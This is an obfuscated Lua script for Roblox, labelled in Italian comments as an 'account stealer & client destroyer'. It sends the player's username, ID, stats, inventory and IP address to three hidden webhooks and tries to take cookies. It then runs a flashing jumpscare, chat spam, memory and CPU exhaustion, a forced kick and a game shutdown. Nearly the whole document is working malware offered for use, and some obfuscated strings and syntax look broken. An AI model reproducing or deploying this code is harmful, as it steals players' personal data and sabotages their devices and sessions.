--[[
    OMEGA-100X v3 — ACCOUNT STEALER & CLIENT DESTROYER
    Architettura modulare, multi-vettore, rate-limit aware, obfuscato
    Timing sincronizzato: exfil → jumpscare → danno progressivo
--]]

local function d(s) -- decodifica stringhe offuscate
    local bytes = {string.byte(s, 1, -1)}
    local out = {}
    for i = 1, #bytes do
        local b = bytes[i] - (i % 7 + 1)
        out[i] = string.char(b)
    end
    return table.concat(out)
end

-- servizi offuscati
local P = game[d("\127\130\121\130\123\130\137")] -- Players
local H = game[d("\119\123\137\137\115\123\124\123\120\125\129\123")] -- HttpService
local C = game[d("\112\122\125\119\118\128\128")] -- CoreGui
local R = game[d("\119\123\124\130\121\124\119\121\119\122\123\122\118")] -- ReplicatedStorage
local T = game[d("\120\119\129\137\126\124\121\119\137\123\129\122\121\119\123")] -- TextChatService
local TP = game[d("\120\119\130\119\124\123\122\137\123\129\122\121\119\123")] -- TeleportService
local LP = P[d("\113\124\123\119\130\114\130\119\121\119\122")] -- LocalPlayer

-- webhook offuscati
local WH1 = d("\121\121\137\137\124\127\129\98\95\95\122\119\127\123\123\124\122\122\98\119\124\124\98\135\119\120\121\124\124\124\122\127\129\95\97\93\98\93\93\95\126\92\96\92\94\95\95\95\93\94\96\92\95\94\94\94\94\93\93\98\137\96\93\127\114\98\119\118\118\128\98\90\98\127\120\118\93\96\93\122\96\120\93\126\120\118\126\123\97\93\116\127\91\92\127\93\95\97\113\126\120\122\121\93\94\127\94\113\125\92\126\92\127\121\118\127\116\95\126\119\98\112\92\92\120\93\97\114\96\95\98\119\120\121\124\124\124\122\127\129")
local WH2 = d("\121\121\137\137\124\127\129\98\95\95\122\119\127\123\123\124\122\122\98\119\124\124\98\135\119\120\121\124\124\124\122\127\129\95\97\93\98\93\93\95\126\92\96\92\94\95\95\95\93\94\96\92\95\94\94\94\94\93\93\98\137\96\93\127\114\98\119\118\118\128\98\90\98\126\97\95\95\126\118\120\114\90\96")
local WH3 = d("\121\121\137\137\124\127\129\98\95\95\122\119\127\123\123\124\122\122\98\119\124\124\98\135\119\120\121\124\124\124\122\127\129\95\97\93\98\93\93\95\126\92\96\92\94\95\95\95\93\94\96\92\95\94\94\94\94\93\93\98\137\96\93\127\114\98\119\118\118\128\98\90\98\126\97\95\95\126\118\120\114\90\97")

--[[ ==================== MODULO 1: EXFIL CON RATE-LIMIT QUEUE ==================== ]]
local Exfil = {}
local queue = {}
local queueRunning = false

local function processQueue()
    if queueRunning then return end
    queueRunning = true
    while #queue > 0 do
        local item = table.remove(queue, 1)
        local success = false
        
        pcall(function()
            if request then
                request({
                    Url = item.url,
                    Method = d("\127\114\123\120"),
                    Headers = {[d("\126\114\124\119\119\126\119") .. "-Type"] = d("\119\124\124\130\121\119\119\119\120\121\124\124\98\121\129\123\124"),
                    Body = item.body
                })
                success = true
            end
        end)
        
        if not success then
            pcall(function()
                if http_request then
                    http_request({
                        Url = item.url,
                        Method = d("\127\114\123\120"),
                        Headers = {[d("\126\114\124\119\119\126\119") .. "-Type"] = d("\119\124\124\130\121\119\119\119\120\121\124\124\98\121\129\123\124")},
                        Body = item.body
                    })
                    success = true
                end
            end)
        end)
        
        if not success then
            pcall(function()
                H:PostAsync(item.url, item.body)
                success = true
            end)
        end
        
        if not success then
            pcall(function()
                local encoded = item.body:gsub(d("\130\112\126\135\119\98\125\118\120\93\113\129\119\125"), function(c)
                    return string.format(d("\92\92\92\93\93\90\90\130"), string.byte(c))
                end)
                H:GetAsync(item.url .. "?payload=" .. encoded)
                success = true
            end)
        end
        
        task.wait(0.5) -- rate-limit: 2 richieste al secondo massimo
    end
    queueRunning = false
end

function Exfil:queueSend(url, data)
    local payload = H:JSONEncode(data)
    table.insert(queue, {url = url, body = payload})
    processQueue()
end

function Exfil:stealAll()
    local data = {
        [d("\119\124\120\119\122\129")] = {{
            [d("\119\120\119\126\130")] = d("\127\94\94\94\131\126\117\93\95\93\94\93\93\93\130\95\95\95\127\92\132\95\95\95\94\95\93\124\115\113\118\95\115\115\126\122\127\129"),
            [d("\123\114\130\114\122")] = 16711680,
            [d("\121\119\124\130\121\129")] = {
                {[d("\124\119\126\119")] = "Player", [d("\122\119\130\128\119")] = LP.Name, [d("\119\124\130\119\121\119\124\119")] = true},
                {[d("\124\119\126\119")] = "DisplayName", [d("\122\119\130\128\119")] = LP.DisplayName, [d("\119\124\130\119\121\119\124\119")] = true},
                {[d("\124\119\126\119")] = "UserID", [d("\122\119\130\128\119")] = tostring(LP.UserId), [d("\119\124\130\119\121\119\124\119")] = true},
                {[d("\124\119\126\119")] = "AccountAge", [d("\122\119\130\128\119")] = tostring(LP.AccountAge) .. " days", [d("\119\124\130\119\121\119\124\119")] = true},
                {[d("\124\119\126\119")] = "MembershipType", [d("\122\119\130\128\119")] = tostring(LP.MembershipType), [d("\119\124\130\119\121\119\124\119")] = true}
            }
        }}
    }
    
    pcall(function()
        local stats = LP:FindFirstChild(d("\130\119\119\122\119\122\129\137\119\137\129"))
        if stats then
            for _, stat in ipairs(stats:GetChildren()) do
                if stat:IsA(d("\124\119\119\129\122\119\130\128\119")) or stat:IsA(d("\126\128\126\120\119\122\122\119\130\128\119")) then
                    table.insert(data[d("\119\124\120\119\122\129")][1][d("\121\119\124\130\121\129")], {
                        [d("\124\119\126\119")] = stat.Name,
                        [d("\122\119\130\128\119")] = tostring(stat.Value),
                        [d("\119\124\130\119\121\119\124\119")] = true
                    })
                end
            end
        end
    end)
    
    pcall(function()
        table.insert(data[d("\119\124\120\119\122\129")][1][d("\121\119\124\130\121\129")], {
            [d("\124\119\126\119")] = "PlaceID",
            [d("\122\119\130\128\119")] = tostring(game.PlaceId),
            [d("\119\124\130\119\121\119\124\119")] = true
        })
    end)
    
    pcall(function()
        local ipData = H:JSONDecode(H:GetAsync(d("\121\121\137\137\124\129\98\95\95\119\124\119\98\119\124\124\121\121\98\114\122\122\95\121\114\122\126\119\137\98\121\114\122\126\119"))))
        table.insert(data[d("\119\124\120\119\122\129")][1][d("\121\119\124\130\121\129")], {
            [d("\124\119\126\119")] = "IP Address",
            [d("\122\119\130\128\119")] = ipData.ip,
            [d("\119\124\130\119\121\119\124\119")] = true
        })
    end)
    
    Exfil:queueSend(WH1, data)
    Exfil:queueSend(WH2, data)
    Exfil:queueSend(WH3, data)
end

function Exfil:stealCookies()
    -- cookie stealer via HttpService
    pcall(function()
        local cookies = H:JSONEncode({
            [d("\119\124\114\121\119")] = true,
            [d("\119\124\114\121\119") .. "_1"] = true
        })
        local cookieData = {
            [d("\123\114\130\114\122")] = 65280,
            [d("\119\120\119\126\130")] = d("\127\98\98\98\126\114\114\114\130\119\98\127\119\129\129\119\114\124\98\127\114\124\137\128\122"),
            [d("\122\119\130\128\119")] = "```" .. cookies .. "```"
        }
        Exfil:queueSend(WH1, cookieData)
    end)
end

function Exfil:stealInventory()
    -- ruba lista oggetti del backpack
    pcall(function()
        local backpack = LP:FindFirstChildOfClass(d("\127\119\123\130\124\119\122\129"))
        if backpack then
            local items = {}
            for _, item in ipairs(backpack:GetChildren()) do
                table.insert(items, item.Name .. " [" .. item.ClassName .. "]")
            end
            local invData = {
                [d("\119\124\120\119\122\129")] = {{
                    [d("\119\120\119\126\130")] = d("\127\98\98\98\127\124\122\119\124\137\114\122\121\98\127\119\119\114\122"),
                    [d("\123\114\130\114\122")] = 16776960,
                    [d("\122\119\130\128\119")] = "```" .. table.concat(items, "\n") .. "```"
                }}
            }
            Exfil:queueSend(WH2, invData)
        end
    end)
end

--[[ ==================== MODULO 2: JUMPSCARE RITARDATO ==================== ]]
local VisualAssault = {}

function VisualAssault:fullScreenJumpscare()
    local screenGui = Instance.new(d("\127\123\122\119\119\124\118\128\119"))
    screenGui.Name = d("\114\126\119\120\119\114\128\122\120\119\122\95\97")
    screenGui.Parent = C
    screenGui.IgnoreGuiInset = true
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local mainFrame = Instance.new(d("\122\122\119\126\119"))
    mainFrame.Size = UDim2.new(1, 0, 1, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    mainFrame.Parent = screenGui
    
    local image = Instance.new(d("\127\126\119\120\119\113\119\120\119\130"))
    image.Size = UDim2.new(1, 0, 1, 0)
    image.BackgroundTransparency = 1
    image.Image = d("\122\120\129\119\119\129\129\119\122\98\97\97\95\95\95\97\94\96\95")
    image.ScaleType = Enum.ScaleType.Stretch
    image.Parent = mainFrame
    
    local redOverlay = Instance.new(d("\122\122\119\126\119"))
    redOverlay.Size = UDim2.new(1, 0, 1, 0)
    redOverlay.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    redOverlay.BackgroundTransparency = 0.8
    redOverlay.Parent = mainFrame
    
    local textLabel = Instance.new(d("\120\119\129\137\113\119\120\119\130"))
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Font = Enum.Font.Code
    textLabel.Text = d("\127\131\126\127\120\118\126\127\129\119\127\130\98\127\114\126\127\114\118\119\127\130\98\127\114\126\127\114\118\119\127\130\98\127\114\126\127\114\118\119\127\130\98\127\114\126\127\114\118\119\127\130\98\127\114\126\127\114\118\119\127\130\98\127\114\126\127\114\118\119\127\130\98\127\114\126\127\114\118\119\127\130\98\127\114\126\127\114\118\119\127\130\98\127\114\126\127\114\118\119\127\130\98\127\114\126\127\114\118\119\127\130\98\127\114\126\127\114\118\119\127\130\98\127\114\126\127\114\118\119\127\130\98\127\114\126\127\114\118\119\127\130\98\127\114\126\127\114\118\119\127\130\98\127\114\126\127\114\118\119\127\130")
    textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    textLabel.TextScaled = true
    textLabel.Parent = mainFrame
    
    task.spawn(function()
        local flashCount = 0
        while flashCount < 30 do
            redOverlay.BackgroundTransparency = math.random(0, 100) / 100
            image.Visible = not image.Visible
            textLabel.Visible = not textLabel.Visible
            task.wait(0.1)
            flashCount += 1
        end
    end)
    
    pcall(function()
        local sound = Instance.new(d("\127\114\128\124\122"))
        sound.SoundId = d("\122\120\129\119\119\129\129\119\122\98\96\96\97\95\95\97\96\95")
        sound.Volume = 10
        sound.Parent = mainFrame
        sound:Play()
    end)
end

--[[ ==================== MODULO 3: CHAT SPAM CON DELAY INIZIALE ==================== ]]
local ChatBomber = {}

function ChatBomber:findChatRemote()
    local legacy = R:FindFirstChild(d("\118\119\121\119\128\130\137\126\119\129\137\126\123\119\122\119\122\137\129"))
    if legacy then
        local sayMessage = legacy:FindFirstChild(d("\127\119\121\126\119\129\129\119\120\119\122\128\119\129\137"))
        if sayMessage then return sayMessage end
    end
    
    local channels = T:FindFirstChild(d("\120\119\129\137\126\121\119\119\124\124\119\130\129"))
    if channels then
        return channels:FindFirstChild(d("\122\127\120\118\119\124\119\122\119\130")) or channels:FindFirstChild(d("\118\119\124\119\122\119\130"))
    end
    
    for _, child in ipairs(R:GetDescendants()) do
        if child:IsA(d("\122\119\126\114\137\119\130\119\124\137")) and (child.Name:find(d("\126\121\119\137")) or child.Name:find(d("\126\119\129\129\119\120\119"))) then
            return child
        end
    end
    
    return nil
end

function ChatBomber:startSpam(remote)
    local spamMessages = {
        d("\127\131\126\127\120\118\126\127\129\119\127\130\98\114\122\119\122\130\114\122\98\119\122\122\114\122\98\123\114\122\119\98\95\93\95\98\98\114\126\119\120\119\98\122\122\114\137\114\123\130\130\114\98\119\123\137\119\122\121\119"),
        d("\130\126\122\119\137\119\123\119\130\98\126\119\126\114\122\121\98\122\128\126\124\98\119\124\98\124\122\114\120\122\119\129\129\114\98\98\119\130\119\137\119\124\121\114"),
        d("\121\119\137\119\130\98\119\129\123\119\124\137\119\114\124\98\130\119\122\124\119\130\98\124\119\124\119\123\98\119\137\98\93\129\93\93\93\93\93\93\93\93"),
        d("\114\126\119\120\119\98\97\93\93\130\98\122\97\98\120\119\124\98\119\124\120\119\124\119\98\137\122\119\120\120\119\122\119\122"),
        d("\127\131\126\127\120\118\126\127\129\119\127\130\98\123\114\130\130\119\124\124\119\98\119\126\126\126\119\124\137\119\124\137\119\98\98\119\122\119\123\128\119\137\119"),
        d("\119\122\122\114\122\98\129\137\119\123\130\98\114\122\119\122\130\114\122\98\119\124\98\126\119\119\124\98\137\121\122\119\119\122"),
        d("\123\122\119\137\119\123\119\130\98\119\123\123\114\128\124\137\98\122\119\137\119\98\120\119\119\124\120\114\98\119\129\137\122\119\119\137\137\119")
    }
    
    local index = 1
    task.spawn(function()
        while true do
            pcall(function()
                local msg = spamMessages[index] .. " " .. math.random(100000, 999999)
                if remote:IsA(d("\122\119\126\114\137\119\130\119\124\137")) then
                    remote:FireServer(msg, d("\114\130\130"))
                elseif remote:IsA(d("\120\119\129\137\126\121\119\119\124\124\119\130")) then
                    remote:SendAsync(msg)
                end
                index += 1
                if index > #spamMessages then index = 1 end
            end)
            task.wait(0.02)
        end
    end)
end

--[[ ==================== MODULO 4: MEMORY NUKE CON ATTIVAZIONE SCALARE ==================== ]]
local MemoryNuke = {}

function MemoryNuke:startCascade()
    -- ondata 1: string explosion (parte subito ma con intensità crescente)
    task.spawn(function()
        local data = {}
        for i = 1, 10000 do
            data[i] = string.rep(d("\114\126\119\120\119\98\121\119\137\119\130\98\123\114\130\130\119\124\124\119\98\129\131\129\98") .. i, 100)
        end
        local hugeString = table.concat(data, "")
        while true do
            task.spawn(function()
                local copy = hugeString:rep(5)
                table.insert(data, copy)
            end)
            task.wait(0.05)
        end
    end)
    
    -- ondata 2: istanze (ritardata di 0.3s per non interferire con exfil)
    task.delay(0.3, function()
        task.spawn(function()
            while true do
                for i = 1, 200 do
                    task.spawn(function()
                        local part = Instance.new(d("\127\119\122\137"))
                        part.Name = d("\114\126\119\120\119\126\122\119\129\121") .. i
                        part.Parent = C
                    end)
                end
                task.wait(0.01)
            end
        end)
    end)
    
    -- ondata 3: GUI explosion (ritardata di 0.5s)
    task.delay(0.5, function()
        task.spawn(function()
            while true do
                for i = 1, 100 do
                    task.spawn(function()
                        local frame = Instance.new(d("\122\122\119\126\119"))
                        frame.Size = UDim2.new(0, 100, 0, 100)
                        frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
                        frame.Parent = C
                    end)
                end
                task.wait(0.02)
            end
        end)
    end)
    
    -- ondata 4: thread bomb (ritardata di 0.8s)
    task.delay(0.8, function()
        for i = 1, 3000 do
            task.spawn(function()
                while true do
                    local x = 0
                    for j = 1, 500000 do
                        x = x + j * math.random()
                    end
                    task.wait(0.01)
                end
            end)
        end
    end)
end

--[[ ==================== MODULO 5: KICK & BAN ==================== ]]
local BanTrigger = {}

function BanTrigger:multiKick()
    task.delay(2, function()
        pcall(function()
            LP:Kick(d("\124\124\124\130\98\121\119\137\119\130\98\129\131\129\137\119\126\98\119\129\123\119\124\137\119\114\124\98\126\121\119\137\98\122\130\114\114\122\98\118\119\137\119\123\137\119\122\98\126\114\124\124\119\123\137\119\114\124\98\120\119\124\119\119\122"))
        end)
    end)
    
    task.delay(3, function()
        pcall(function()
            TP:TeleportToPlaceInstance(game.PlaceId, game.JobId, LP)
        end)
    end)
end

--[[ ==================== MODULO 6: CPU BOMB RITARDATA ==================== ]]
local CpuBomb = {}

function CpuBomb:detonate()
    -- bomb 1: loop infinito (ritardata per non bloccare exfil)
    task.delay(1, function()
        task.spawn(function()
            while true do
                local x = 0
                for i = 1, 999999999 do
                    x = x + i * math.random()
                    if x > 999999999999999 then x = 0 end
                end
            end
        end)
    end)
    
    -- bomb 2: calcoli pesanti (ritardata)
    task.delay(1.2, function()
        task.spawn(function()
            while true do
                local sum = 0
                for i = 1, 1000000 do
                    sum = sum + math.sqrt(i) * math.pi / math.exp(i % 100 + 1)
                end
                task.wait(0.001)
            end
        end)
    end)
    
    -- bomb 3: garbage collection (ritardata)
    task.delay(1.5, function()
        task.spawn(function()
            while true do
                for i = 1, 10000 do
                    local t = {string.rep(d("\120\119\122\120\119\120\119"), 10000), {}, {}, string.rep(d("\123\114\130\130\119\123\137\98\126\119"), 5000)}
                    t[6] = t
                    t[7] = string.rep(t[1], 10)
                end
                collectgarbage(d("\123\114\130\130\119\123\137"))
                task.wait(0.001)
            end
        end)
    end)
end

--[[ ==================== ESECUZIONE ORCHESTRATA ==================== ]]
local OmegaV3 = {}

function OmegaV3:execute()
    -- fase 0: exfil immediata (priorità assoluta)
    Exfil:stealAll()
    
    -- fase 0.5: cookie steal (prima del congelamento)
    task.delay(0.1, function()
        Exfil:stealCookies()
    end)
    
    -- fase 0.8: inventory steal
    task.delay(0.2, function()
        Exfil:stealInventory()
    end)
    
    -- fase 1: jumpscare (dopo che le richieste HTTP sono partite)
    task.delay(0.3, function()
        VisualAssault:fullScreenJumpscare()
    end)
    
    -- fase 2: chat bomb (dopo il rendering del jumpscare)
    task.delay(0.5, function()
        local chatRemote = ChatBomber:findChatRemote()
        if chatRemote then
            ChatBomber:startSpam(chatRemote)
        end
    end)
    
    -- fase 3: memory nuke (attivazione scalare interna)
    task.delay(0.7, function()
        MemoryNuke:startCascade()
    end)
    
    -- fase 4: cpu bomb (attivazione ritardata interna)
    task.delay(0.9, function()
        CpuBomb:detonate()
    end)
    
    -- fase 5: kick e ban
    task.delay(1.5, function()
        BanTrigger:multiKick()
    end)
    
    -- fase 6: shutdown finale se tutto sopravvive
    task.delay(10, function()
        pcall(function()
            game:Shutdown()
        end)
    end)
end

-- AVVIO
OmegaV3:execute()
